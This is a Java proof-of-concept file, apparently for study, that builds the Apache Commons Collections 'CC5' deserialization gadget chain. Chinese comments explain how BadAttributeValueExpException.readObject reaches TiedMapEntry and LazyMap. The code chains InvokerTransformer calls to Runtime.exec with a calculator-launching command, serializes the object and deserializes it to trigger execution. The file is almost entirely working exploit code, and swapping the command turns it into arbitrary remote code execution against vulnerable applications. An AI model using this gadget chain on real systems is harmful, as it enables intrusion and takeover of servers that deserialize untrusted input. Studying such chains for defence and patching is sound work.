package org.example.sec.ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/*
1、TiedMapEntry,TiedMapEntry中的toString方法调用了getValue方法然后再getValue中调用了map.get方法
而在TiedMapEntry的构造方法传入了map赋值给map成员变量，
也就是说只要将map设置成我们的LazyMap，当我们调用TiedMapEntry#toString的时候即可自动调用我们的LazyMap.get
2、然后寻找哪里的readObject会调用到toString方法，
找到BadAttributeValueExpException类的readObject方法调用了val成员变量的toString方法，
在BadAttributeValueExpException的构造方法中会调用toString方法直接触发了利用链，
所以我们需要利用反射方式设置val的值。
 */
public class cc5 {
    public static void main(String[] args) throws NoSuchMethodException, IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);

        Map hashMap = new HashMap();
        Map lazymap = LazyMap.decorate(hashMap, chainedTransformer);
        //TiedMapEntry传入LazyMap
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "lsf");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        //反射设置val值为TiedMapEntry实例
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(badAttributeValueExpException);

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();

    }
}